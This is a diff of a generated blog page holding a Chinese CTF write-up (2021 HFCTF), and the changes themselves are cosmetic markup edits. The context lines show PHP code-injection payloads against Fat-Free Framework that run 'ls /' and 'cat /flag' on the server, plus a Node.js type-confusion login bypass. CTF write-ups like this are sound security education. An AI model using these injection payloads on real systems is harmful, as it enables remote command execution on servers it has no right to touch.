@@ -264,7 +264,7 @@
         <li><div class="divider"></div></li>
         <li>
             <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
+                <i class="fab fa-github-square fa-fw"></i>Follow Me
             </a>
         </li>
         
@@ -321,7 +321,7 @@
 </style>
 
 <a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
+   data-tooltip="Follow Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
         <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
@@ -560,6 +560,7 @@
 <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$f3</span><span class="token operator">-&gt;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token variable">$f3</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>是 <a target="_blank" rel="noopener" href="https://fatfreeframework.com/"><em>Fat-Free Framework</em></a> ，一查发现 3.7.1 版本存在 RCE 漏洞 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2020-5203">CVE-2020-5203</a>。</p>
 <p>但这个漏洞在 3.7.2 修复了。</p>
 <p>根据 <code>/lib/CHANGELOG.md</code>，得知题目用到的版本是 <code>3.7.2 (28 May 2020)</code></p>
@@ -585,16 +586,20 @@
         <span class="token comment">// Remove from cache</span>
         <span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>再看 changelog</p>
 <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165248921.png"></p>
 <p>根据 <a target="_blank" rel="noopener" href="https://github.com/bcosca/fatfree/issues/1206">https://github.com/bcosca/fatfree/issues/1206</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/bcosca/fatfree/issues/1191">https://github.com/bcosca/fatfree/issues/1191</a></p>
 <p>正则匹配对 <code>[]</code> 处理不当，于是构造 payload</p>
 <pre class="line-numbers language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);phpinfo(<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163552160.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);system('ls /'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163641868.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);system('cat /flag'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163713448.png"></p>
 <p><code>flag{dfc91022-dc9d-481a-8b46-cff1ce6e51be}</code></p>
 <h3 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h3><blockquote>
@@ -673,7 +678,7 @@ router<span class="token punctuation">.</span><span class="token function">get</
     <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>admin<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">}</span><span class="token punctuation">)</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">admin</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>admin<span class="token punctuation">}</span><span class="token punctuation">)</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span>
 
@@ -688,7 +693,7 @@ router<span class="token punctuation">.</span><span class="token function">get</
     <span class="token keyword">const</span> status <span class="token operator">=</span> <span class="token constant">WAF_LISTS</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">waf</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>a<span class="token operator">&amp;&amp;</span>b<span class="token punctuation">)</span>
 
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'WAF'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">"Here is the waf..."</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'WAF'</span><span class="token punctuation">,</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">"Here is the waf..."</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
         <span class="token keyword">try</span> <span class="token punctuation">{</span>
             <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/search?url=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
@@ -713,10 +718,10 @@ router<span class="token punctuation">.</span><span class="token function">post<
 
 router<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'You can only use proxy to aceess here!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">'You can only use proxy to aceess here!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
     <span class="token punctuation">}</span>
 
-    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Search Success'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>
+    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Search Success'</span><span class="token punctuation">,</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>
 
     <span class="token keyword">const</span> method <span class="token operator">=</span> req<span class="token punctuation">.</span>method<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
@@ -747,12 +752,13 @@ router<span class="token punctuation">.</span><span class="token function">get</
 
 router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'No Flag For You!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">'No Flag For You!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
     <span class="token punctuation">}</span>
-    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>hint<span class="token operator">:</span> hint<span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">hint</span><span class="token operator">:</span> hint<span class="token punctuation">}</span><span class="token punctuation">)</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span>
 
 module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>首先需要登录，这里用到了 JavaScript 弱类型的特性。</p>
 <p>参考 <a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/2037.html">SuSeC CTF 2020 Writeup &amp; 基于Node.JS的sha1绕过分析</a> </p>
 <p>以及 <a target="_blank" rel="noopener" href="https://d6s3.ac.cn/post/nodejs-url-library-character-mapping-problem/">Node.js中url.parse函数的潜在安全问题</a></p>
@@ -760,6 +766,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
 <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404235528295.png"></p>
 <p>这里是用 GET query 传参，可以构造 payload</p>
 <pre class="line-numbers language-none"><code class="language-none">username[]=admin&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>就能成功以管理员身份进入。</p>
 <p>接下来打 ssrf……</p>
 <p><del>（题目环境关了复现不了了啊嘤嘤嘤</del></p>
@@ -1199,7 +1206,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
             + '来源: MiaoTony&#39;s小窝<br />'
             + '文章作者: MiaoTony<br />'
             + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';
+            + '本文章著作权归作者 MiaoTony 所有，任何形式的转载都请注明出处。';
 
         selection.selectAllChildren(newdiv);
         window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
@@ -1565,8 +1572,6 @@ $(function () {
 </script>
 
     
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
